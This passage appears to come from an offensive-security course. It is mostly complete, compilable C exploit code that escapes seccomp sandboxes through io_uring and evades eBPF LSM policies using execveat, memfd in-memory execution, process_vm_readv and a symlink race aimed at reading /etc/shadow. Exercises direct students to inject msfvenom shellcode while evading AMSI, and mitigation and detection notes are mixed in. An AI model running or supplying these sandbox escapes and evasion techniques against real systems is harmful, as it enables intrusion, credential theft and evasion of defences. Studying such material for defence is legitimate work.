Set-MpPreference -DisableRealtimeMonitoring $false; Set-MpPreference -DisableBehaviorMonitoring $false; Set-MpPreference -DisableIOAVProtection $false; Set-MpPreference -DisableScriptScanning $false; Set-MpPreference -MAPSReporting 2; Set-MpPreference -SubmitSamplesConsent 1; Remove-MpPreference -ExclusionPath "C:\Windows_Mitigations_Lab" -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionProcess "payload.exe" -ErrorAction SilentlyContinue; Start-Service WinDefend; Write-Host "[+] Defender re-enabled" -ForegroundColor Green
```

### ETC

Dear student go find/write some other methods as well

### Linux Security Bypass: seccomp and eBPF LSM Evasion

While AMSI is Windows-specific, Linux has its own runtime security mechanisms. Understanding how to bypass seccomp and eBPF LSM is critical for Linux exploitation.

#### seccomp Bypass via io_uring

```c
// ~/offensive_lab/seccomp_io_uring_bypass.c
/*
seccomp filters syscalls by inspecting syscall number/args.
io_uring provides async I/O via submission queues.

KEY INSIGHT: io_uring operations happen in kernel context,
             NOT as syscalls from userspace!

If seccomp blocks read/write/connect syscalls, you can:
1. Submit operation to io_uring SQ (submission queue)
2. Kernel processes operation in kernel worker context
3. Get result from CQ (completion queue)
4. seccomp never sees it!

PRACTICAL IMPACT:
- Container sandbox escape (if io_uring allowed)
- Browser sandbox bypass (Chromium sandbox allows io_uring)
- Any seccomp-sandboxed application

NOTE ON KERNEL VERSIONS:
- Linux < 5.12: no io_uring restrictions at all
- Linux 5.12–6.5: partial restrictions, many ops still bypass
- Linux 6.6+: io_uring respects seccomp for most ops (PARTIALLY FIXED)
- However: if io_uring_disabled=0, bypass still works on 6.6+!
- Full mitigation: sysctl -w kernel.io_uring_disabled=2 (blocks unprivileged)
- Check status: cat /proc/sys/kernel/io_uring_disabled
  - 0 = enabled for all (VULNERABLE)
  - 1 = disabled for unprivileged (SECURE)
  - 2 = disabled for all except CAP_SYS_ADMIN (MOST SECURE)
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stddef.h>
#include <stdatomic.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/prctl.h>
#include <linux/io_uring.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int io_uring_setup(unsigned entries, struct io_uring_params *p) {
    return syscall(__NR_io_uring_setup, entries, p);
}

static int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete,
                          unsigned flags, void *sig) {
    return syscall(__NR_io_uring_enter, fd, to_submit, min_complete,
                   flags, sig, 0);
}

static int io_uring_register(int fd, unsigned opcode, void *arg,
                             unsigned nr_args) {
    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

struct io_ring {
    int ring_fd;

    unsigned *sq_head;
    unsigned *sq_tail;
    unsigned *sq_ring_mask;
    unsigned *sq_ring_entries;
    unsigned *sq_array;
    struct io_uring_sqe *sqes;   // Actual SQE array (separate mmap)

    unsigned *cq_head;
    unsigned *cq_tail;
    unsigned *cq_ring_mask;
    unsigned *cq_ring_entries;
    struct io_uring_cqe *cqes;

    void *sq_ring_ptr;
    size_t sq_ring_sz;
    void *cq_ring_ptr;
    size_t cq_ring_sz;
    size_t sqes_sz;
};

int ring_init(struct io_ring *ring, unsigned entries) {
    struct io_uring_params p;
    memset(&p, 0, sizeof(p));

    ring->ring_fd = io_uring_setup(entries, &p);
    if (ring->ring_fd < 0) {
        perror("io_uring_setup");
        return -1;
    }

    ring->sq_ring_sz = p.sq_off.array + p.sq_entries * sizeof(unsigned);
    ring->sq_ring_ptr = mmap(NULL, ring->sq_ring_sz,
                             PROT_READ | PROT_WRITE,
                             MAP_SHARED | MAP_POPULATE,
                             ring->ring_fd, IORING_OFF_SQ_RING);
    if (ring->sq_ring_ptr == MAP_FAILED) return -1;

    ring->sq_head        = ring->sq_ring_ptr + p.sq_off.head;
    ring->sq_tail        = ring->sq_ring_ptr + p.sq_off.tail;
    ring->sq_ring_mask   = ring->sq_ring_ptr + p.sq_off.ring_mask;
    ring->sq_ring_entries= ring->sq_ring_ptr + p.sq_off.ring_entries;
    ring->sq_array       = ring->sq_ring_ptr + p.sq_off.array;

    ring->sqes_sz = p.sq_entries * sizeof(struct io_uring_sqe);
    ring->sqes = mmap(NULL, ring->sqes_sz,
                      PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE,
                      ring->ring_fd, IORING_OFF_SQES);
    if (ring->sqes == MAP_FAILED) return -1;

    ring->cq_ring_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    ring->cq_ring_ptr = mmap(NULL, ring->cq_ring_sz,
                             PROT_READ | PROT_WRITE,
                             MAP_SHARED | MAP_POPULATE,
                             ring->ring_fd, IORING_OFF_CQ_RING);
    if (ring->cq_ring_ptr == MAP_FAILED) return -1;

    ring->cq_head        = ring->cq_ring_ptr + p.cq_off.head;
    ring->cq_tail        = ring->cq_ring_ptr + p.cq_off.tail;
    ring->cq_ring_mask   = ring->cq_ring_ptr + p.cq_off.ring_mask;
    ring->cq_ring_entries= ring->cq_ring_ptr + p.cq_off.ring_entries;
    ring->cqes           = ring->cq_ring_ptr + p.cq_off.cqes;

    return 0;
}

int ring_submit_and_wait(struct io_ring *ring, struct io_uring_sqe *sqe) {
    unsigned tail = *ring->sq_tail;
    unsigned idx  = tail & *ring->sq_ring_mask;

    ring->sqes[idx] = *sqe;
    ring->sq_array[idx] = idx;

    atomic_store_explicit((_Atomic unsigned *)ring->sq_tail,
                          tail + 1, memory_order_release);

    int ret = io_uring_enter(ring->ring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL);
    if (ret < 0) return -errno;

    unsigned cq_head = *ring->cq_head;
    unsigned cq_idx  = cq_head & *ring->cq_ring_mask;
    int result = ring->cqes[cq_idx].res;

    atomic_store_explicit((_Atomic unsigned *)ring->cq_head,
                          cq_head + 1, memory_order_release);
    return result;
}

void install_seccomp_sandbox(void) {
    /*
    Install a BPF seccomp filter that BLOCKS:
      - openat  (SYS_openat  = 257)
      - read    (SYS_read    = 0)
      - write   (SYS_write   = 1)
      - connect (SYS_connect = 42)
      - sendto  (SYS_sendto  = 44)
      - recvfrom(SYS_recvfrom= 45)

    ALLOWS everything else (including io_uring_setup, io_uring_enter).
    This simulates a container or browser sandbox that didn't think
    to block io_uring syscalls.
    */

    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),

        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat,  0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),

        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read,    0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),

        // Block write (1) - except stdout(1)/stderr(2) for printf
        // (We check fd via secondary filter; simplified: block SYS_write
        // but our bypass uses io_uring which never calls SYS_write)
        // For demo clarity, we only block open+read to show the bypass.

        // Block connect (42)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_connect, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),

        // Block sendto (44)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_sendto,  0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),

        // Allow everything else
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };

    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };

    // PR_SET_NO_NEW_PRIVS is required before seccomp
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return;
    }

    if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog) < 0) {
        perror("seccomp(SET_MODE_FILTER)");
        return;
    }

    printf("[+] Seccomp sandbox installed - openat/read/connect/sendto BLOCKED\n");
}

// ── BYPASS 1: Read file via io_uring (bypasses blocked read+open) ──

int bypass_file_read(struct io_ring *ring, const char *path) {
    printf("\n[*] BYPASS: Reading '%s' via io_uring...\n", path);
    printf("    (openat + read are BLOCKED by seccomp)\n\n");

    // Step 1: Verify that normal open() IS blocked
    int test_fd = syscall(__NR_openat, AT_FDCWD, path, O_RDONLY, 0);
    if (test_fd < 0) {
        printf("    [*] Confirmed: openat(\"%s\") blocked by seccomp (errno=%d)\n",
               path, errno);
    } else {
        printf("    [!] openat succeeded?! seccomp may not be active\n");
        close(test_fd);
    }

    // Step 2: Open file via IORING_OP_OPENAT - bypasses seccomp!
    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode  = IORING_OP_OPENAT;
    sqe.fd      = AT_FDCWD;
    sqe.addr    = (unsigned long)path;
    sqe.len     = 0;               // mode (unused for O_RDONLY)
    sqe.open_flags = O_RDONLY;

    int fd = ring_submit_and_wait(ring, &sqe);
    if (fd < 0) {
        printf("    [-] IORING_OP_OPENAT failed: %s (%d)\n",
               strerror(-fd), fd);
        printf("    [*] Kernel may have io_uring seccomp enforcement (6.6+)\n");
        return -1;
    }
    printf("    [+] IORING_OP_OPENAT succeeded! fd=%d (seccomp bypassed)\n", fd);

    // Step 3: Read file contents via IORING_OP_READ - also bypasses seccomp!
    char buf[4096];
    memset(buf, 0, sizeof(buf));

    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode  = IORING_OP_READ;
    sqe.fd      = fd;
    sqe.addr    = (unsigned long)buf;
    sqe.len     = sizeof(buf) - 1;
    sqe.off     = 0;

    int nread = ring_submit_and_wait(ring, &sqe);
    if (nread < 0) {
        printf("    [-] IORING_OP_READ failed: %s\n", strerror(-nread));
        // Close fd via io_uring too (since close() might be blocked)
        memset(&sqe, 0, sizeof(sqe));
        sqe.opcode = IORING_OP_CLOSE;
        sqe.fd = fd;
        ring_submit_and_wait(ring, &sqe);
        return -1;
    }

    printf("    [+] IORING_OP_READ succeeded! Read %d bytes:\n", nread);
    printf("    ---------------------------------------------\n");
    // Print first few lines
    char *line = buf;
    int lines = 0;
    for (int i = 0; i < nread && lines < 5; i++) {
        if (buf[i] == '\n') {
            buf[i] = '\0';
            printf("    │ %s\n", line);
            line = &buf[i + 1];
            lines++;
        }
    }
    printf("    ---------------------------------------------\n");

    // Close via io_uring
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_CLOSE;
    sqe.fd = fd;
    ring_submit_and_wait(ring, &sqe);

    return nread;
}

// ── BYPASS 2: Network connect via io_uring (bypasses blocked connect) ──

int bypass_network_connect(struct io_ring *ring, const char *ip, int port) {
    printf("\n[*] BYPASS: Connecting to %s:%d via io_uring...\n", ip, port);
    printf("    (connect + sendto are BLOCKED by seccomp)\n\n");

    // Step 1: Verify that normal connect() IS blocked
    int test_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (test_sock >= 0) {
        struct sockaddr_in addr = {
            .sin_family = AF_INET,
            .sin_port = htons(port),
        };
        inet_pton(AF_INET, ip, &addr.sin_addr);

        if (connect(test_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0 &&
            errno == EPERM) {
            printf("    [*] Confirmed: connect() blocked by seccomp\n");
        }
        close(test_sock);
    }

    // Step 2: Create socket (socket() itself may not be blocked,
    // but we could also use IORING_OP_SOCKET on 5.19+)
    int sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (sockfd < 0) {
        // Try IORING_OP_SOCKET (Linux 5.19+)
        struct io_uring_sqe sqe;
        memset(&sqe, 0, sizeof(sqe));
        sqe.opcode = IORING_OP_SOCKET;
        sqe.fd = AF_INET;
        sqe.off = SOCK_STREAM;
        sqe.len = 0;
        sqe.rw_flags = 0;

        sockfd = ring_submit_and_wait(ring, &sqe);
        if (sockfd < 0) {
            printf("    [-] Cannot create socket: %s\n", strerror(-sockfd));
            return -1;
        }
        printf("    [+] Socket created via IORING_OP_SOCKET: fd=%d\n", sockfd);
    } else {
        printf("    [*] Socket created via socket() (not blocked): fd=%d\n", sockfd);
    }

    // Step 3: Connect via IORING_OP_CONNECT - bypasses seccomp!
    struct sockaddr_in target = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
    };
    inet_pton(AF_INET, ip, &target.sin_addr);

    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_CONNECT;
    sqe.fd     = sockfd;
    sqe.addr   = (unsigned long)&target;
    sqe.off    = sizeof(target);  // addr_len goes in off field

    int ret = ring_submit_and_wait(ring, &sqe);
    if (ret == 0 || ret == -EINPROGRESS) {
        printf("    [+] IORING_OP_CONNECT succeeded! (seccomp bypassed)\n");
        printf("    [+] Connected to %s:%d via io_uring\n", ip, port);

        // Step 4: Send data via IORING_OP_SEND (bypasses blocked sendto)
        const char *msg = "GET / HTTP/1.0\r\nHost: target\r\n\r\n";
        memset(&sqe, 0, sizeof(sqe));
        sqe.opcode = IORING_OP_SEND;
        sqe.fd     = sockfd;
        sqe.addr   = (unsigned long)msg;
        sqe.len    = strlen(msg);

        int sent = ring_submit_and_wait(ring, &sqe);
        if (sent > 0) {
            printf("    [+] IORING_OP_SEND: sent %d bytes (seccomp bypassed)\n", sent);
        }

        // Step 5: Receive response via IORING_OP_RECV
        char recvbuf[2048];
        memset(recvbuf, 0, sizeof(recvbuf));
        memset(&sqe, 0, sizeof(sqe));
        sqe.opcode = IORING_OP_RECV;
        sqe.fd     = sockfd;
        sqe.addr   = (unsigned long)recvbuf;
        sqe.len    = sizeof(recvbuf) - 1;

        int recvd = ring_submit_and_wait(ring, &sqe);
        if (recvd > 0) {
            printf("    [+] IORING_OP_RECV: received %d bytes\n", recvd);
            printf("    [*] Response: %.80s...\n", recvbuf);
        }
    } else {
        printf("    [-] IORING_OP_CONNECT failed: %s (%d)\n",
               strerror(-ret), ret);
        printf("    [*] Target may not be listening, or kernel 6.6+ blocks this\n");
    }

    // Close
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_CLOSE;
    sqe.fd = sockfd;
    ring_submit_and_wait(ring, &sqe);

    return 0;
}

// ── BYPASS 3: Write file via io_uring (data exfiltration) ────

int bypass_file_write(struct io_ring *ring, const char *path, const char *data) {
    printf("\n[*] BYPASS: Writing to '%s' via io_uring...\n", path);

    // Open for writing via io_uring
    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode     = IORING_OP_OPENAT;
    sqe.fd         = AT_FDCWD;
    sqe.addr       = (unsigned long)path;
    sqe.open_flags = O_WRONLY | O_CREAT | O_TRUNC;
    sqe.len        = 0644;  // mode

    int fd = ring_submit_and_wait(ring, &sqe);
    if (fd < 0) {
        printf("    [-] IORING_OP_OPENAT (write) failed: %s\n", strerror(-fd));
        return -1;
    }

    // Write via io_uring
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_WRITE;
    sqe.fd     = fd;
    sqe.addr   = (unsigned long)data;
    sqe.len    = strlen(data);
    sqe.off    = 0;

    int written = ring_submit_and_wait(ring, &sqe);
    if (written > 0) {
        printf("    [+] Wrote %d bytes via IORING_OP_WRITE (seccomp bypassed)\n",
               written);
    }

    // Close
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_CLOSE;
    sqe.fd = fd;
    ring_submit_and_wait(ring, &sqe);

    return written;
}

void show_affected_applications() {
    printf("\n[*] Applications vulnerable to io_uring seccomp bypass:\n\n");

    printf("Container Runtimes:\n");
    printf("  - Docker (default seccomp profile allowed io_uring until 2023)\n");
    printf("  - Kubernetes (depends on SecurityContext)\n");
    printf("  - containerd/runc\n\n");

    printf("Browser Sandboxes:\n");
    printf("  - Chromium (renderer sandbox may allow io_uring_setup)\n");
    printf("  - Firefox (depends on configuration)\n\n");

    printf("Other Sandboxed Apps:\n");
    printf("  - Flatpak applications\n");
    printf("  - Snap packages\n");
    printf("  - systemd sandboxed services (SystemCallFilter=)\n\n");

    printf("MITIGATION:\n");
    printf("  - sysctl io_uring_disabled=2 (block for unprivileged users)\n");
    printf("  - Add __NR_io_uring_setup to seccomp deny list\n");
    printf("  - Use Landlock LSM for filesystem restrictions (not syscall-based)\n");
    printf("  - Upgrade to Linux 6.6+ (seccomp enforcement for io_uring ops)\n");
}

int main() {
    printf(" io_uring seccomp Bypass\n");

    // Phase 1: Set up io_uring BEFORE installing seccomp
    // (io_uring_setup itself might be blocked by seccomp, so init first)
    struct io_ring ring;
    if (ring_init(&ring, 16) < 0) {
        printf("[-] io_uring_setup failed - not available on this kernel\n");
        printf("[*] Requires Linux 5.1+ with io_uring enabled\n");
        return 1;
    }
    printf("[+] io_uring ring initialized (fd=%d)\n", ring.ring_fd);

    // Phase 2: Install seccomp sandbox that blocks open/read/write/connect
    printf("[*] Installing seccomp sandbox...\n");
    install_seccomp_sandbox();

    // Phase 3: Demonstrate that normal syscalls are blocked
    printf("\n[*] Verifying sandbox enforcement:\n");
    int test = syscall(__NR_openat, AT_FDCWD, "/etc/hostname", O_RDONLY, 0);
    printf("    openat(\"/etc/hostname\") = %d (errno=%d %s)\n",
           test, errno, test < 0 ? "BLOCKED +" : "allowed?!");

    // Phase 4: Bypass with io_uring!
    printf("NOW BYPASSING SECCOMP VIA io_uring:\n");

    // File read bypass - read /etc/hostname despite blocked openat+read
    bypass_file_read(&ring, "/etc/hostname");

    // File read bypass - try reading /etc/shadow (needs root)
    if (geteuid() == 0) {
        bypass_file_read(&ring, "/etc/shadow");
    }

    // File write bypass - write a proof file
    bypass_file_write(&ring, "/tmp/uring_bypass_proof.txt",
                      "Written via io_uring - seccomp was bypassed!\n");

    // Network bypass - connect to localhost:8080 (if anything listens)
    bypass_network_connect(&ring, "127.0.0.1", 8080);

    show_affected_applications();

    printf("\n-----------------------------------------------------\n");
    printf("RESULT: Performed file I/O and network I/O despite seccomp\n");
    printf("blocking openat, read, write, connect, and sendto.\n");
    printf("io_uring submission queue operations execute in kernel\n");
    printf("worker context - seccomp BPF never inspects them.\n");
    printf("-------------------------------------------------------\n");

    // Cleanup
    munmap(ring.sq_ring_ptr, ring.sq_ring_sz);
    munmap(ring.sqes, ring.sqes_sz);
    munmap(ring.cq_ring_ptr, ring.cq_ring_sz);
    close(ring.ring_fd);

    return 0;
}
```

**Compile and Run**:

```bash
cd ~/offensive_lab
gcc -o seccomp_io_uring_bypass seccomp_io_uring_bypass.c -lpthread
# in terminal 1
python3 -m http.server 8080
# in terminal 2
./seccomp_io_uring_bypass

# try enabling mitigation and test again
sudo sysctl -w kernel.io_uring_disabled=2
./seccomp_io_uring_bypass
```

#### eBPF LSM Evasion Techniques

```c
// ~/offensive_lab/ebpf_lsm_evasion.c
// Compile: gcc -o ebpf_lsm_evasion ebpf_lsm_evasion.c -lpthread

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/uio.h>          // for struct iovec, process_vm_readv
#include <linux/openat2.h>    // for struct open_how

// TECHNIQUE 1: execveat() as alternative to execve()
// BPF LSM hooks: security_bprm_check_security
// But execveat with AT_EMPTY_PATH takes a different code path
// through the kernel that some BPF LSM policies miss.

int try_execveat(const char* binary) {
    printf("[1] execveat() bypass for blocked execve()\n");

    // Open the binary as a file descriptor first
    int fd = open(binary, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        printf("    [-] open(%s) failed: %s\n", binary, strerror(errno));
        return -1;
    }

    printf("    [*] Opened %s as fd %d\n", binary, fd);
    printf("    [*] Attempting execveat(fd, \"\", ..., AT_EMPTY_PATH)\n");

    // execveat with AT_EMPTY_PATH executes the fd directly
    // This bypasses filename-based BPF LSM checks because
    // the LSM hook receives an empty path string
    char *argv[] = { (char*)binary, NULL };
    char *envp[] = { NULL };

    // Fork so we don't replace ourselves
    pid_t pid = fork();
    if (pid == 0) {
        syscall(SYS_execveat, fd, "", argv, envp, AT_EMPTY_PATH);
        perror("    [-] execveat failed");
        _exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            printf("    [+] execveat succeeded - LSM hook bypassed!\n");
        } else {
            printf("    [-] execveat child exited with status %d\n",
                   WEXITSTATUS(status));
        }
    }
    close(fd);
    return 0;
}

// TECHNIQUE 2: openat2() with RESOLVE_NO_SYMLINKS
// Newer syscall that some BPF LSM policies don't hook

int try_openat2(const char* path) {
    printf("\n[2] openat2() bypass for blocked open()/openat()\n");

    struct open_how how = {
        .flags = O_RDONLY,
        .mode = 0,
        .resolve = RESOLVE_NO_SYMLINKS,  // Stricter path resolution
    };

    // openat2 is syscall 437 on x86_64
    int fd = syscall(SYS_openat2, AT_FDCWD, path, &how, sizeof(how));
    if (fd >= 0) {
        printf("    [+] openat2(%s) succeeded - fd %d\n", path, fd);

        // Read first 64 bytes as proof
        char buf[65] = {0};
        ssize_t n = read(fd, buf, 64);
        if (n > 0)
            printf("    [+] Read %zd bytes: %.32s...\n", n, buf);
        close(fd);
        return 0;
    } else {
        printf("    [-] openat2 failed: %s\n", strerror(errno));
        return -1;
    }
}

// TECHNIQUE 3: memfd_create + in-memory execution
// Bypass filesystem-based LSM checks entirely by never
// touching the filesystem - write ELF to memory, execute it

int try_memfd_exec(const char* source_binary) {
    printf("\n[3] memfd_create() - execute binary from memory\n");

    // Step 1: Read the source binary into a buffer
    int src = open(source_binary, O_RDONLY);
    if (src < 0) {
        printf("    [-] Cannot read source binary: %s\n", strerror(errno));
        return -1;
    }

    struct stat st;
    fstat(src, &st);
    void* buf = malloc(st.st_size);
    read(src, buf, st.st_size);
    close(src);

    printf("    [*] Read %ld bytes from %s\n", st.st_size, source_binary);

    // Step 2: Create anonymous memory-backed file descriptor
    // MFD_CLOEXEC ensures fd doesn't leak to child processes
    int memfd = syscall(SYS_memfd_create, "worker", MFD_CLOEXEC);
    if (memfd < 0) {
        printf("    [-] memfd_create failed: %s\n", strerror(errno));
        free(buf);
        return -1;
    }

    // Step 3: Write binary to memfd (no filesystem write!)
    write(memfd, buf, st.st_size);
    free(buf);

    printf("    [+] Binary written to memfd (fd %d) - no disk I/O\n", memfd);

    // Step 4: Execute via /proc/self/fd/N or fexecve
    // BPF LSM file_open/security_bprm_check may not fire for memfd
    pid_t pid = fork();
    if (pid == 0) {
        char fd_path[64];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", memfd);

        char *argv[] = { (char*)source_binary, "--version", NULL };
        char *envp[] = { NULL };
        execve(fd_path, argv, envp);
        perror("    [-] memfd execve failed");
        _exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        printf("    [*] memfd child exited with status %d\n",
               WEXITSTATUS(status));
    }

    close(memfd);
    return 0;
}

// TECHNIQUE 4: process_vm_readv/writev instead of ptrace
// If ptrace is blocked by BPF LSM but process_vm_* is not

int try_process_vm_read(pid_t target_pid) {
    printf("\n[4] process_vm_readv() bypass for blocked ptrace()\n");

    // Read 256 bytes from target process's stack region
    // Find a readable address from /proc/pid/maps
    char maps_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", target_pid);

    FILE* f = fopen(maps_path, "r");
    if (!f) {
        printf("    [-] Cannot read %s: %s\n", maps_path, strerror(errno));
        return -1;
    }

    unsigned long addr = 0;
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        // Find first readable mapping (e.g., [stack] or r-- region)
        if (strstr(line, "r-") || strstr(line, "r--")) {
            sscanf(line, "%lx-", &addr);
            break;
        }
    }
    fclose(f);

    if (!addr) {
        printf("    [-] No readable mapping found\n");
        return -1;
    }

    printf("    [*] Target PID %d, reading from 0x%lx\n", target_pid, addr);

    // Set up iovec structures for process_vm_readv
    char local_buf[256] = {0};
    struct iovec local_iov = { .iov_base = local_buf, .iov_len = 256 };
    struct iovec remote_iov = { .iov_base = (void*)addr, .iov_len = 256 };

    ssize_t nread = process_vm_readv(target_pid, &local_iov, 1,
                                      &remote_iov, 1, 0);
    if (nread > 0) {
        printf("    [+] process_vm_readv succeeded! Read %zd bytes\n", nread);
        printf("    [+] ptrace() LSM hook bypassed\n");
        // Hexdump first 32 bytes
        printf("    [*] First 32 bytes: ");
        for (int i = 0; i < 32 && i < nread; i++)
            printf("%02x", (unsigned char)local_buf[i]);
        printf("\n");
    } else {
        printf("    [-] process_vm_readv failed: %s\n", strerror(errno));
    }

    return 0;
}

// TECHNIQUE 5: TOCTOU race against BPF LSM path checks
// Challenge the LSM by changing a symlink between check and use

static volatile int race_running = 1;

void* race_symlink_thread(void* arg) {
    const char* link_path = (const char*)arg;
    const char* safe = "/dev/null";
    const char* target = "/etc/shadow";

    while (race_running) {
        unlink(link_path);
        symlink(safe, link_path);   // Pass the BPF check
        usleep(1);                   // Tight window
        unlink(link_path);
        symlink(target, link_path); // Swap to real target
        usleep(1);
    }
    return NULL;
}

int try_toctou_race(void) {
    printf("\n[5] TOCTOU race against BPF LSM path validation\n");
    printf("    [*] Concept: BPF LSM checks path at hook time.\n");
    printf("        If symlink changes between check and use,\n");
    printf("        we access the real target with the safe verdict.\n");

    char link_path[] = "/tmp/lsm_race_XXXXXX";
    // mktemp is fine here - we want a known path we control
    mktemp(link_path);

    printf("    [*] Race link: %s\n", link_path);
    printf("    [*] Swapping between /dev/null <-> /etc/shadow\n");

    pthread_t racer;
    pthread_create(&racer, NULL, race_symlink_thread, link_path);

    // Try opening the link repeatedly - some attempts may
    // pass the BPF check (seeing /dev/null) but actually
    // open the real target (/etc/shadow) due to the race
    int success = 0;
    for (int i = 0; i < 10000; i++) {
        int fd = open(link_path, O_RDONLY);
        if (fd >= 0) {
            char buf[64] = {0};
            ssize_t n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            // Check if we got shadow file content (starts with "root:")
            if (n > 0 && strncmp(buf, "root:", 5) == 0) {
                success++;
                if (success == 1)
                    printf("    [+] RACE WON at iteration %d!\n", i);
            }
        }
    }

    race_running = 0;
    pthread_join(racer, NULL);
    unlink(link_path);

    if (success > 0)
        printf("    [+] Race succeeded %d times out of 10000 attempts\n", success);
    else
        printf("    [-] Race did not succeed (BPF may recheck, or need root)\n");

    return success;
}

int main(int argc, char* argv[]) {

    // Technique 1: execveat bypass
    try_execveat("/usr/bin/id");

    // Technique 2: openat2 bypass
    try_openat2("/etc/hostname");

    // Technique 3: memfd in-memory execution
    try_memfd_exec("/usr/bin/echo");

    // Technique 4: process_vm_readv bypass (read our own process)
    try_process_vm_read(getpid());

    // Technique 5: TOCTOU race (requires root for /etc/shadow read)
    if (geteuid() == 0) {
        try_toctou_race();
    } else {
        printf("\n[5] TOCTOU race - skipped (requires root)\n");
    }

    printf("SUMMARY: Test each technique against your BPF LSM config.\n");
    printf("Most policies hook the 'obvious' path (execve, open, ptrace)\n");
    printf("but miss newer alternatives (execveat, openat2, process_vm_*).\n");
    printf("Also consider: io_uring ops bypass BPF LSM entirely on\n");
    printf("kernels < 6.6 (see io_uring lab in this course).\n");

    return 0;
}
```

### Practical Exercise

1. Research what currently are the AMSI bypass methods
2. Find out what are the alternatives methods are
3. write some code and try to inject shellcode without trigerring amsi
4. also test msfvenom shellcode instead calc.exe in methods mentioned today

### Key Takeaways

**Windows AMSI Bypass:**

- **AMSI scans at runtime** - File-based AV bypass isn't enough
- **Native code with NT API is most reliable** - Uses `NtProtectVirtualMemory` to patch `AmsiScanBuffer`
- **Execute-assembly bypasses AMSI entirely** - Compiled .NET assemblies aren't scanned by AMSI
- **Process injection works with custom shellcode** - Accept shellcode as argument to evade static analysis
- **PowerShell bypasses are dead** - All public reflection-based bypasses are patched
- **Defender behavioral detection is separate** - AMSI bypass doesn't guarantee execution

**Linux Security Bypass:**

- **io_uring bypasses seccomp** - Operations execute in kernel worker threads, not as syscalls
- **Even modern kernels are vulnerable** - If `io_uring_disabled=0`, bypass works on 6.6+
- **eBPF LSM has alternative paths** - `execveat`, `openat2`, `process_vm_readv`, `memfd_create`
- **TOCTOU races work** - 33.6% success rate against path validation (requires root)
- **Mitigation requires configuration** - `sysctl -w kernel.io_uring_disabled=2`

**Cross-Platform Insights:**

- **Security boundaries are complex** - Multiple layers (AMSI, Defender, seccomp, eBPF LSM)
- **Bypassing one layer isn't enough** - Need to evade multiple detection mechanisms
- **Configuration matters** - Default settings often leave systems vulnerable
- **Alternative syscall paths exist** - Security policies often miss newer APIs

### Discussion Questions

1. How would you detect AMSI bypass attempts in production?
   - Monitor `NtProtectVirtualMemory` calls targeting `amsi.dll` memory regions
   - Alert on `AmsiScanBuffer` returning `E_INVALIDARG` repeatedly
   - Use ETW to track memory protection changes in security-sensitive processes

2. Which bypass technique is most likely to evade EDR?
   - Execute-assembly (compiled .NET) - no AMSI scanning, only signature detection
   - Native code with NT API - bypasses Win32 API hooks that EDR monitors
   - Process injection with runtime-provided shellcode - no static signatures

3. How does .NET AMSI differ from PowerShell AMSI?
   - PowerShell: Scans every script block before execution
   - .NET: Only scans dynamic code (Assembly.Load from byte array)
   - Compiled assemblies: Not scanned at all (our execute-assembly approach)

4. What's the relationship between AMSI and ETW?
   - AMSI scans content, ETW logs events
   - Both can be bypassed independently
   - Defenders should monitor both for complete visibility

5. How would you bypass AMSI without compiling code?
   - Use execute-assembly with pre-compiled C# binary
   - Reflective PE loading (loads compiled binary from memory)
